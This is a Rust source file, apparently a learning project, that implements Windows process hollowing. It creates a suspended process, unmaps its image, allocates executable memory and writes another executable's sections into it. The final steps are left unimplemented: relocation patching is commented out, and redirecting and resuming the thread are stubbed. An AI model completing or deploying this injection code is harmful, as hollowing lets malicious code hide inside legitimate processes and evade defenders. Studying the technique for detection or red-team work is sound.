#[macro_use]
extern crate bitfield;

pub mod pe;

// TODO: remove this module
pub mod mem;

use crate::pe::{
    read_image32, read_image64, read_remote_image32, read_remote_image64, get_image_base_address,
    X96, x96_check, x96_check_from_remote
};
use anyhow::*;
use ntapi::ntmmapi:: NtUnmapViewOfSection;
use winapi::shared::{
    ntdef::{ BOOLEAN, HANDLE, ULONG },
    minwindef::{ LPCVOID, PUCHAR, UCHAR }
};
use winapi::um::{
    memoryapi::{ VirtualAllocEx, ReadProcessMemory, WriteProcessMemory },
    processthreadsapi::{ CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION },
    winbase::CREATE_SUSPENDED,
    winnt:: { IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_SECTION_HEADER, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE }
};

use std::{fs::File, mem::size_of};
use std::ffi::CString;
use std::mem::zeroed;
use std::io::prelude::*;
use std::ptr::null_mut;

const STATUS_SUCCESS: i32 = 0x0;
const DOT_RELOC: [u8; 8] = [46, 114, 101, 108, 111, 99, 0, 0];

#[repr(C)]
struct BASE_RELOCATION_BLOCK {
    PageAddress: u32,
    BlockSize: u32,
}

bitfield! {
    struct BASE_RELOCATION_ENTRY([u8]);
    impl Debug;
    u8;
    //u16, offset, _: 11, 0;
    //u8, block_type, _: 15, 12;
    u8, block_type, _: 3, 0;
    u16, offset, _: 15, 4;
}

pub unsafe fn hollow(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    // Create dest process
    let mut startup = zeroed::<STARTUPINFOA>();
    let mut process_info = zeroed::<PROCESS_INFORMATION>();

    let dest = CString::new(dest.into()).expect("CString::new failed");
    CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

    // Get dest image, image_address
    let hp = process_info.hProcess;
    let dest_image_address = get_image_base_address(hp);
    let dest_image = read_remote_image64(hp, dest_image_address)?;

    // TODO: remove debug print
    println!("dest Signature: {:?}", (*dest_image.FileHeader).Signature);
    println!("dest Machine: {:?}", (*dest_image.FileHeader).FileHeader.Machine);
    println!("dest Architecture: {:?}", x96_check_from_remote(process_info.hProcess, dest_image_address));

    // this did not worked, i guess image =/= not image_base_address so
    // println!("Architecture: {:?}", x96_check(&mut image));

    // TODO: read src program and mapping
    let file_name = src.into();

    let mut f = File::open(&file_name).with_context(|| format!("could not opening the file: {}", &file_name))?;
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer).with_context(|| format!("could not reading from the file: {}", &file_name))?;

    // TODO: remove debug print
    // as example, sample.exe is 64bit so expect Architecture output is X96::X64
    // then at here, using read_image64
    // and need to pass buffer[0], not buffer. becase &buffer is Vec struct pointer.
    // arg pointer should be buffer's first pointer so
    // btw, "&mut buffer[0] as *const _ as *mut _" is ugly, i have to change better code...
    let src_image = read_image64(&mut buffer[0] as *const _ as *mut _);
    println!("src Signature: {:?}", (*src_image.FileHeader).Signature);
    println!("src Machine: {:?}", (*src_image.FileHeader).FileHeader.Machine);
    println!("src Architecture: {:?}", x96_check(&mut buffer[0]));

    // Unmapping image from dest process
    if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
        bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
    };

    // Allocate memory for src program
    let src_nt_header = *src_image.FileHeader;
    let dest_image_memory = VirtualAllocEx(
        hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if dest_image_memory as usize == 0x0 {
        bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
    };

    // Delta relocation
    let delta = dest_image_address as usize - src_nt_header.OptionalHeader.ImageBase as usize;
    // TODO: remove debug print
    println!("Source image base: 0x{:x}", src_nt_header.OptionalHeader.ImageBase);
    println!("Destination image base: {:?}", dest_image_memory);
    println!("Relocation delta: 0x{:x}", delta);

    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u64;
    // TODO: remove debug print
    println!("Changed source image base: 0x{:x}", (*src_image.FileHeader).OptionalHeader.ImageBase);

    if WriteProcessMemory(
        hp, dest_image_address as *mut _, &mut buffer[0] as *const _ as *mut _,
        (*src_image.FileHeader).OptionalHeader.SizeOfHeaders as usize, null_mut()) == 0 {
        bail!("could not write process memory.");
    }

    let src_sections = std::slice::from_raw_parts(src_image.Sections, src_image.NumberOfSections as usize);

    for section in src_sections {
        // TODO: remove debug print
        println!("pointer to raw data: 0x{:x}", section.PointerToRawData);
        println!("pointer to raw data size: 0x{:x}", section.SizeOfRawData);

        let p_dest_section = dest_image_address as usize + section.VirtualAddress as usize;

        // TODO: remove debug print
        println!("writing {:?} section to 0x{:x}", section.Name, p_dest_section);

        if WriteProcessMemory(
            hp, p_dest_section as *mut _, &mut buffer[section.PointerToRawData as usize] as *const _ as *mut _,
            section.SizeOfRawData as usize, null_mut()) == 0 {
            bail!("could not write process memory.");
        }
    }

    if delta != 0x0 {
        for section in src_sections {
            // TODO: remove debug print
            println!("section name: {:?}", String::from_utf8(section.Name.into()));

            //if memcmp(&section.Name as *const _, &DOT_RELOC as *const _, DOT_RELOC.len()) > 0  { continue }
            if section.Name != DOT_RELOC { continue }

            // rebase image flow
            let reloc_address = section.PointerToRawData;
            let mut offset = 0;
            let reloc_data = (*src_image.FileHeader).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

            while offset < reloc_data.Size {
                let block_header = std::ptr::read::<BASE_RELOCATION_BLOCK>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _);
                println!("base reloc addr: {}", block_header.PageAddress);
                println!("base reloc size: {}", block_header.BlockSize);

                offset = offset + std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32;

                // 2 is relocation entry size.
                // ref: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                let entry_count = (block_header.BlockSize - std::mem::size_of::<BASE_RELOCATION_BLOCK>() as u32) / 2;

                let block_entry = std::slice::from_raw_parts::<[u8; 2]>(&mut buffer[(reloc_address + offset) as usize] as *const _ as *mut _, entry_count as usize);

                for block in block_entry {
                    let block = BASE_RELOCATION_ENTRY(*block);
                    // TODO: remove debug print
                    println!("block type: {:?}", block.block_type());
                    println!("block offset: 0x{:x}", block.offset());

                    offset = offset + 2;

                    if block.block_type() == 0 { continue }

                    let field_address = block_header.PageAddress + block.offset() as u32;
                    println!("page address: 0x{:x}", block_header.PageAddress);
                    println!("field_address: 0x{:x}", field_address);

                    let mut d_buffer = zeroed::<u32>();

                    // failed for now, i dont know
                    /*
                    if ReadProcessMemory(
                        hp, (dest_image_address as u32 + field_address) as LPCVOID,
                        &mut d_buffer as *const _ as *mut _, size_of::<u32>(), null_mut()) != 1 {
                        bail!("could not read process memory.");
                    }
                    println!("d_buffer: {:?}", d_buffer);
                    d_buffer = d_buffer + delta as u32;
                    */
                }
            }
        }
    }

    // TODO: Get thread context of dest, and modify entry point
    if false { unimplemented!() }

    // TODO: Resume thread of dest
    if false { unimplemented!() }

    // TODO: remove debug print
    println!("process was hollowed ε٩(๑> 3 <)۶з");

    Ok(())
}

pub unsafe extern fn memcmp(s1: *const u8, s2: *const u8, n: usize) -> i32 {
    let mut i = 0;
    while i < n {
        let a = *s1.offset(i as isize);
        let b = *s2.offset(i as isize);
        if a != b {
            return a as i32 - b as i32
        }
        i += 1;
    }
    return 0;
}
